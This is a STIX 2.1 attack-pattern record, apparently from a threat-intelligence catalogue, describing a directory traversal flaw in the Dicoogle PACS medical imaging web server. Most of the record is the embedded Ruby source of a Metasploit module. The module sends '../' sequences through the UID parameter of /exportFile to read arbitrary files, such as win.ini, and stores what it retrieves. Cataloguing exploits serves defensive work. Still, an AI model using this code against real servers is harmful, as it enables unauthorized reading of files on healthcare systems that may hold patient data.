{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c60583f9-8a68-4054-945b-104cdf93bb93",
    "created": "2024-08-14T16:28:47.721737Z",
    "modified": "2024-08-14T16:28:47.721741Z",
    "name": "Dicoogle PACS Web Server Directory Traversal",
    "description": " This module exploits an unauthenticated directory traversal vulnerability in the Dicoogle PACS Web Server v2.5.0 and possibly earlier, allowing an attacker to read arbitrary files with the web server privileges. While the application is java based, the directory traversal was only successful against Windows targets.  'References'  => [ ['EDB', '45007'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/dicoogle_traversal.rb",
            "external_id": "dicoogle_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Dicoogle PACS Web Server Directory Traversal',\n      'Description' => %q{\n        This module exploits an unauthenticated directory traversal vulnerability\n        in the Dicoogle PACS Web Server v2.5.0 and possibly earlier, allowing an\n        attacker to read arbitrary files with the web server privileges.\n        While the application is java based, the directory traversal was only\n        successful against Windows targets.\n      },\n      'References'  =>\n        [\n          ['EDB', '45007']\n        ],\n      'Author'      =>\n        [\n          'Carlos Avila', # Vulnerability discovery\n          'h00die' # Metasploit module\n        ],\n      'DisclosureDate' => '2018-07-11',\n      'License'     => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/windows/win.ini']),\n        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 15 ])\n      ])\n\n  end\n\n  def run_host(ip)\n    filename = datastore['FILEPATH']\n    traversal = \"../\" * datastore['DEPTH'] << filename\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => '/exportFile',\n      'vars_get' => {\n        'UID' => traversal\n      }\n    })\n\n    unless res && res.code == 200\n      print_error('Nothing was downloaded')\n      return\n    end\n\n    vprint_good(\"#{peer} - #{res.body}\")\n    path = store_loot(\n      'dicoogle.traversal',\n      'text/plain',\n      ip,\n      res.body,\n      filename\n    )\n    print_good(\"File saved in: #{path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-07-11"
}